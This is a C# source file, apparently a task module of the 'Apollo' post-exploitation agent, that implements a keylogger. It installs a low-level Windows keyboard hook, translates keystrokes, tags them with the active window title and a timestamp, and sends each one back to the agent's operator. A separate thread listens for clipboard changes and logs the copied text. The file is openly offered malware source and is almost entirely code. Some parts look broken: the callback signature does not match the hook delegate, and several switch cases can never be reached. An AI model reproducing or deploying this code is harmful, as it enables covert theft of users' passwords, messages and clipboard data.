using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Apollo.Jobs;

namespace Apollo.Tasks
{
    public class Keylogger
    {
        public static void Execute(Job job, Agent agent)
        {
            try
            {
                // Start the clipboard
                ThreadStart clipboardThreadStart = new ThreadStart(BootClipboard);
                Thread clipboardThread = new Thread(clipboardThreadStart);
                clipboardThread.Start();
                //Application.Run(new ClipboardNotification.NotificationForm());
                Win32.User32.HookProc callback = CallbackFunction;
                var module = System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName;
                var moduleHandle = Win32.Kernel32.GetModuleHandle(module);
                var hook = Win32.User32.SetWindowsHookEx(Win32.User32.HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);

                while (true)
                {
                    Win32.User32.PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
                }
            }
            catch (Exception ex)
            {
                job.Task.message = ex.Message;
                job.Task.status = "error";
            }
        }

        private static IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam, Agent agent, Task task)
        {
            try
            {
                Int32 msgType = wParam.ToInt32();
                Int32 vKey;
                string key = "";
                string lastTitle = "";
                if (code >= 0 && (msgType == 0x100 || msgType == 0x104))
                {
                    bool shift = false;
                    IntPtr hWindow = Win32.User32.GetForegroundWindow();
                    short shiftState = Win32.User32.GetAsyncKeyState(Keys.ShiftKey);
                    if ((shiftState & 0x8000) == 0x8000)
                    {
                        shift = true;
                    }
                    var caps = Console.CapsLock;

                    // read virtual key from buffer
                    vKey = System.Runtime.InteropServices.Marshal.ReadInt32(lParam);

                    // Parse key
                    if (vKey > 64 && vKey < 91)
                    {
                        if (shift | caps)
                        {
                            key = ((Keys)vKey).ToString();
                        }
                        else
                        {
                            key = ((Keys)vKey).ToString().ToLower();
                        }
                    }
                    else if (vKey >= 96 && vKey <= 111)
                    {
                        switch (vKey)
                        {
                            case 96:
                                key = "0";
                                break;
                            case 97:
                                key = "1";
                                break;
                            case 98:
                                key = "2";
                                break;
                            case 99:
                                key = "3";
                                break;
                            case 100:
                                key = "4";
                                break;
                            case 101:
                                key = "5";
                                break;
                            case 102:
                                key = "6";
                                break;
                            case 103:
                                key = "7";
                                break;
                            case 104:
                                key = "8";
                                break;
                            case 105:
                                key = "9";
                                break;
                            case 106:
                                key = "*";
                                break;
                            case 107:
                                key = "+";
                                break;
                            case 108:
                                key = "|";
                                break;
                            case 109:
                                key = "-";
                                break;
                            case 110:
                                key = ".";
                                break;
                            case 111:
                                key = "/";
                                break;
                        }
                    }
                    else if ((vKey >= 48 && vKey <= 57) || (vKey >= 186 && vKey <= 192))
                    {
                        if (shift)
                        {
                            switch (vKey)
                            {
                                case 48:
                                    key = ")";
                                    break;
                                case 49:
                                    key = "!";
                                    break;
                                case 50:
                                    key = "@";
                                    break;
                                case 51:
                                    key = "#";
                                    break;
                                case 52:
                                    key = "$";
                                    break;
                                case 53:
                                    key = "%";
                                    break;
                                case 54:
                                    key = "^";
                                    break;
                                case 55:
                                    key = "&";
                                    break;
                                case 56:
                                    key = "*";
                                    break;
                                case 57:
                                    key = "(";
                                    break;
                                case 186:
                                    key = ":";
                                    break;
                                case 187:
                                    key = "+";
                                    break;
                                case 188:
                                    key = "<";
                                    break;
                                case 189:
                                    key = "_";
                                    break;
                                case 190:
                                    key = ">";
                                    break;
                                case 191:
                                    key = "?";
                                    break;
                                case 192:
                                    key = "~";
                                    break;
                                case 219:
                                    key = "{";
                                    break;
                                case 220:
                                    key = "|";
                                    break;
                                case 221:
                                    key = "}";
                                    break;
                                case 222:
                                    key = "<Double Quotes>";
                                    break;
                            }
                        }
                        else
                        {
                            switch (vKey)
                            {
                                case 48:
                                    key = "0";
                                    break;
                                case 49:
                                    key = "1";
                                    break;
                                case 50:
                                    key = "2";
                                    break;
                                case 51:
                                    key = "3";
                                    break;
                                case 52:
                                    key = "4";
                                    break;
                                case 53:
                                    key = "5";
                                    break;
                                case 54:
                                    key = "6";
                                    break;
                                case 55:
                                    key = "7";
                                    break;
                                case 56:
                                    key = "8";
                                    break;
                                case 57:
                                    key = "9";
                                    break;
                                case 186:
                                    key = ";";
                                    break;
                                case 187:
                                    key = "=";
                                    break;
                                case 188:
                                    key = ",";
                                    break;
                                case 189:
                                    key = "-";
                                    break;
                                case 190:
                                    key = ".";
                                    break;
                                case 191:
                                    key = "/";
                                    break;
                                case 192:
                                    key = "`";
                                    break;
                                case 219:
                                    key = "[";
                                    break;
                                case 220:
                                    key = "\\";
                                    break;
                                case 221:
                                    key = "]";
                                    break;
                                case 222:
                                    key = "<Single Quote>";
                                    break;
                            }
                        }
                    }
                    else
                    {
                        switch ((Keys)vKey)
                        {
                            case Keys.F1:
                                key = "<F1>";
                                break;
                            case Keys.F2:
                                key = "<F2>";
                                break;
                            case Keys.F3:
                                key = "<F3>";
                                break;
                            case Keys.F4:
                                key = "<F4>";
                                break;
                            case Keys.F5:
                                key = "<F5>";
                                break;
                            case Keys.F6:
                                key = "<F6>";
                                break;
                            case Keys.F7:
                                key = "<F7>";
                                break;
                            case Keys.F8:
                                key = "<F8>";
                                break;
                            case Keys.F9:
                                key = "<F9>";
                                break;
                            case Keys.F10:
                                key = "<F10>";
                                break;
                            case Keys.F11:
                                key = "<F11>";
                                break;
                            case Keys.F12:
                                key = "<F12>";
                                break;

                            //case Keys.Snapshot:
                            //    key = "<Print Screen>";
                            //    break;
                            //case Keys.Scroll:
                            //    key = "<Scroll Lock>";
                            //    break;
                            //case Keys.Pause:
                            //    key = "<Pause/Break>";
                            //    break;
                            case Keys.Insert:
                                key = "<Insert>";
                                break;
                            //case Keys.Home:
                            //    key = "<Home>";
                            //    break;
                            case Keys.Delete:
                                key = "<Delete>";
                                break;
                            //case Keys.End:
                            //    key = "<End>";
                            //    break;
                            //case Keys.Prior:
                            //    key = "<Page Up>";
                            //    break;
                            //case Keys.Next:
                            //    key = "<Page Down>";
                            //    break;
                            //case Keys.Escape:
                            //    key = "<Esc>";
                            //    break;
                            //case Keys.NumLock:
                            //    key = "<Num Lock>";
                            //    break;
                            //case Keys.Capital:
                            //    key = "<Caps Lock>";
                            //    break;
                            case Keys.Tab:
                                key = "<Tab>";
                                break;
                            case Keys.Back:
                                key = "<Backspace>";
                                break;
                            case Keys.Enter:
                                key = "<Enter>";
                                break;
                            case Keys.Space:
                                key = "<Space Bar>";
                                break;
                            case Keys.Left:
                                key = "<Left>";
                                break;
                            case Keys.Up:
                                key = "<Up>";
                                break;
                            case Keys.Right:
                                key = "<Right>";
                                break;
                            case Keys.Down:
                                key = "<Down>";
                                break;
                            case Keys.LMenu:
                                key = "<Alt>";
                                break;
                            case Keys.RMenu:
                                key = "<Alt>";
                                break;
                            case Keys.LWin:
                                key = "<Windows Key>";
                                break;
                            case Keys.RWin:
                                key = "<Windows Key>";
                                break;
                            //case Keys.LShiftKey:
                            //    key = "<Shift>";
                            //    break;
                            //case Keys.RShiftKey:
                            //    key = "<Shift>";
                            //    break;
                            case Keys.LControlKey:
                                key = "<Ctrl>";
                                break;
                            case Keys.RControlKey:
                                key = "<Ctrl>";
                                break;
                        }
                    }

                    StringBuilder title = new StringBuilder(256);
                    Win32.User32.GetWindowText(hWindow, title, title.Capacity);

                    Dictionary<string, string> props = new Dictionary<string, string>();
                    props["Key"] = key;
                    props["Time"] = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss tt");
                    props["Window"] = title.ToString();
                    if (props["Window"] != lastTitle)
                    {
                        string titleString =    "Window  : " + props["Window"] + Environment.NewLine +
                                                "Time    : " + props["Time"] + Environment.NewLine +
                                                "----------------------------------------------";
                        lastTitle = props["Window"];
                    }
                    TaskResponse response = new TaskResponse(task.id, false, props, "");
                    agent.TryGetPostResponse(response);
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }
            return Win32.User32.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }

        private static void BootClipboard()
        {
            Application.Run(new ClipboardNotification.NotificationForm());
        }
    }

    public static class Clipboard
    {
        public static string GetText()
        {
            string ReturnValue = string.Empty;
            Thread STAThread = new Thread(
                delegate ()
                {
                        // Use a fully qualified name for Clipboard otherwise it
                        // will end up calling itself.
                        ReturnValue = System.Windows.Forms.Clipboard.GetText();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            return ReturnValue;
        }
    }

    public sealed class ClipboardNotification
    {
        public class NotificationForm : Form
        {
            string lastWindow = "";

            public NotificationForm()
            {
                //Turn the child window into a message-only window (refer to Microsoft docs)
                Win32.User32.SetParent(Handle, Win32.User32.HWND_MESSAGE);
                //Place window in the system-maintained clipboard format listener list
                Win32.User32.AddClipboardFormatListener(Handle);
            }

            protected override void WndProc(ref Message m)
            {
                try
                {
                    //Listen for operating system messages
                    if (m.Msg == Win32.User32.WM_CLIPBOARDUPDATE)
                    {
                        //Write to stdout active window
                        IntPtr active_window = Win32.User32.GetForegroundWindow();
                        if (active_window != IntPtr.Zero && active_window != null)
                        {
                            int length = Win32.User32.GetWindowTextLength(active_window);
                            StringBuilder sb = new StringBuilder(length + 1);
                            Win32.User32.GetWindowText(active_window, sb, sb.Capacity);
                            Trace.WriteLine("");
                            //Write to stdout clipboard contents
                            try
                            {
                                Trace.WriteLine("\t[cntrl-C] Clipboard Copied: " + Clipboard.GetText());
                            }
                            catch (Exception ex)
                            {
                                throw new Exception("\t[Error] Couldn't get text from clipboard.");
                            }
                        }
                    }
                    //Called for any unhandled messages
                    base.WndProc(ref m);
                }
                catch (Exception ex)
                {
                    throw ex;
                }
            }
        }

    }

}
